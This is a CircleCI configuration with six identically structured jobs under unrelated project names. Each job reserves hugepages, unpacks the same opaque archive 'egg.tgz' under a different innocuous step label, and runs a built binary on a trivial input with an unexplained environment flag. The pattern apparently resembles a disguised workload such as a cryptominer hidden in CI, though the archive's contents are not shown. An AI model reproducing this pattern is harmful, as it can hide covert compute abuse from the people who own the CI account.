version: 2.1

jobs:
  timeTravelDebug:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load recording
          command: |
            : > session.rec
      - run:
          name: Build time-travel debugger
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target timeTravelDebug -j2
      - run:
          name: Step backward
          command: LIONSS_LP=1 ./build/timeTravelDebug --rec session.rec --reverse
  FioRandwrite:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set job
          command: |
            printf 'bs=4k\niodepth=32\n' > fio.ini
      - run:
          name: Build io benchmark
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target FioRandwrite -j2
      - run:
          name: Random write test
          command: LIONSS_LP=1 ./build/FioRandwrite --job fio.ini --runtime 30
  nim-orc:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write source
          command: |
            printf 'echo 1\n' > m.nim
      - run:
          name: Build ORC collector
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target nim-orc -j2
      - run:
          name: Collect cyclic refs
          command: LIONSS_LP=1 ./build/nim-orc --in m.nim --gc orc
  predicate_pushdown:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write filter
          command: |
            printf 'x > 10\n' > pred.txt
      - run:
          name: Build rewriter
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target predicate_pushdown -j2
      - run:
          name: Push predicates down
          command: LIONSS_LP=1 ./build/predicate_pushdown --pred pred.txt --into scan
  etl_gold_rollup:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Stage gold inputs
          command: |
            mkdir -p gold && printf 'k,v\na,1\n' > gold/in.csv
      - run:
          name: Build aggregation job
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target etl_gold_rollup -j2
      - run:
          name: Roll up gold layer
          command: LIONSS_LP=1 ./build/etl_gold_rollup --input gold --grain daily
  indigoFox:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Trace route
          command: |
            printf 'hops = 6\n' > fox.cfg
      - run:
          name: Build routing core
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target indigoFox -j2
      - run:
          name: Trace indigo path
          command: LIONSS_LP=1 ./build/indigoFox --config fox.cfg --metric latency
